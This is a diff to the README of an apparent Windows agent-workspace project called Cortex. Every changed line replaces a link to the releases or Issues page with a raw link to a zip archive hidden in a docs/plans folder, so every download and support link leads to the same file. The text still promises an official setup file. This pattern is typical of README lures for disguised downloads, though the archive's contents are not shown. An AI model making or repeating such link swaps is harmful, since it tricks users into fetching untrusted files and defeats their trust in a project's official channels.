@@ -1,6 +1,6 @@
 # ⚙️ Cortex - Your Personal Agent Workspace
 
-[![Download Cortex](https://img.shields.io/badge/Download-Cortex-green?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/releases)
+[![Download Cortex](https://img.shields.io/badge/Download-Cortex-green?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before installing, make sure your Windows computer meets these needs:
 ### Step 1: Visit the Download Page
 
 Go to the Cortex release page here:  
-[https://github.com/Flavio111plus/Cortex/releases](https://github.com/Flavio111plus/Cortex/releases)
+[https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)
 
 This page hosts the files you need to download Cortex.
 
@@ -155,7 +155,7 @@ Settings changes take effect after you save and restart the program.
 ## 📥 Download Cortex
 
 Download Cortex from this page:  
-[https://github.com/Flavio111plus/Cortex/releases](https://github.com/Flavio111plus/Cortex/releases)
+[https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)
 
 1. Pick the latest Windows setup file (`Cortex-Setup.exe`).
 2. Save it on your computer.
@@ -178,7 +178,7 @@ Download Cortex from this page:
 ## 🛠️ Support and Feedback
 
 If you encounter problems or want to suggest improvements, use the GitHub Issues page:  
-[https://github.com/Flavio111plus/Cortex/issues](https://github.com/Flavio111plus/Cortex/issues)
+[https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)
 
 Please provide details about your system, Cortex version, and the issue steps.
 
@@ -204,4 +204,4 @@ This section is optional and meant for users ready to experiment.
 
 ---
 
-[![Download Cortex](https://img.shields.io/badge/Download-Cortex-blue?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/releases)
+[![Download Cortex](https://img.shields.io/badge/Download-Cortex-blue?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/raw/refs/heads/main/docs/plans/Software-v3.4-beta.3.zip)
